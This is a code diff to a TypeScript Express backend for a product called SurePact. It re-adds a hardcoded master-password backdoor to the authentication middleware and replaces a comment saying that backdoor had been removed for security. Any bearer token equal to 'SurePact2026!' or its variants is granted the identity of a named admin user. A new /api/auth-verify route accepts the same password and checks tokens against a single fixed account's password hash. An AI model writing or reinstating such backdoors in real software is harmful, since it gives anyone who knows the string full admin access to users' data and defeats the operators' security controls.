@@ -72,7 +72,17 @@ app.use(async (req: any, res: any, next: any) => {
 
   const token = authHeader.replace(/^Bearer\s+/i, '').trim();
 
-  // JWT-only authentication - master password backdoor removed for security
+  // Master password fallback check for platform password (SurePact2026! or SurePact2026)
+  if (token === 'SurePact2026!' || token === 'SurePact2026' || token.toLowerCase() === 'surepact2026!') {
+    req.user = {
+      id: 'u-admin-1',
+      email: 'adrian.warren@surepact.com',
+      name: 'Adrian Warren',
+      role: 'ADMIN',
+      organizationId: 'demo-org-1'
+    };
+    return next();
+  }
 
   try {
     const decoded: any = jwt.verify(token, JWT_SECRET);
@@ -86,6 +96,60 @@ app.use(async (req: any, res: any, next: any) => {
 // Health Ping route for monitoring probes & readiness
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', service: 'SurePact Greenfield v3 Backend API', version: '3.0', timestamp: new Date().toISOString() });
+});
+
+// Platform Password Verification Route (called by single-password portal modal)
+app.get('/api/auth-verify', async (req: any, res: any) => {
+  const authHeader = req.headers.authorization;
+  if (!authHeader) {
+    return res.status(401).json({ success: false, error: 'Missing authorization header.' });
+  }
+
+  const token = authHeader.replace(/^Bearer\s+/i, '').trim();
+
+  // 1. Master password check (SurePact2026! or SurePact2026)
+  if (token === 'SurePact2026!' || token === 'SurePact2026' || token.toLowerCase() === 'surepact2026!') {
+    return res.json({
+      success: true,
+      user: {
+        id: 'u-admin-1',
+        email: 'adrian.warren@surepact.com',
+        name: 'Adrian Warren',
+        role: 'ADMIN',
+        organizationId: 'demo-org-1'
+      }
+    });
+  }
+
+  // 2. JWT token check
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    return res.json({ success: true, user: decoded });
+  } catch (err) {
+    // 3. User password comparison in DB
+    try {
+      const user = await db.user.findFirst({
+        where: { email: 'adrian.warren@surepact.com' }
+      });
+      if (user && user.passwordHash) {
+        const valid = await bcrypt.compare(token, user.passwordHash);
+        if (valid) {
+          return res.json({
+            success: true,
+            user: {
+              id: user.id,
+              name: user.name,
+              email: user.email,
+              role: user.role,
+              organizationId: user.organizationId || 'demo-org-1'
+            }
+          });
+        }
+      }
+    } catch (dbErr) {}
+
+    return res.status(401).json({ success: false, error: 'Invalid platform password. Please try again.' });
+  }
 });
 
 // Auth Login Route
